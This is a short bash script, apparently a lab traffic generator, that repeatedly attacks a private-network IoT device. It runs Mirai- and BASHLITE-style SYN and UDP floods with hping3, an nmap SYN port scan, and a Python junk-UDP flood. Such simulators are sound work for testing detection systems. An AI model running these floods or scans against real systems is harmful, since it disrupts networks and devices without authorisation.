#!/bin/bash
# attack_traffic.sh - standalone attacker simulator (hping3/nmap based)
TARGET="192.168.100.10"   # IoT device IP

echo "[Attacker] Waiting for IoT device to come online..."
sleep 10
echo "[Attacker] Starting attack simulation..."

while true; do
    # SYN flood (Mirai-style)
    echo "[*] SYN Flood (Mirai-style)..."
    hping3 -S --flood -V -p 80 $TARGET > /dev/null 2>&1 &
    sleep 5
    kill %1 2>/dev/null

    # UDP flood (BASHLITE-style)
    echo "[*] UDP Flood (BASHLITE-style)..."
    hping3 --udp --flood -p 53 $TARGET > /dev/null 2>&1 &
    sleep 5
    kill %1 2>/dev/null

    # Port scan (Mirai propagation)
    echo "[*] Port Scan (Mirai propagation scan)..."
    nmap -sS -p 23,80,443,8080 $TARGET > /dev/null 2>&1

    # Junk UDP flood
    echo "[*] Junk data flood..."
    python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for i in range(500):
    s.sendto(b'X'*1024, ('$TARGET', 9999))
s.close()
"
    sleep 10
done
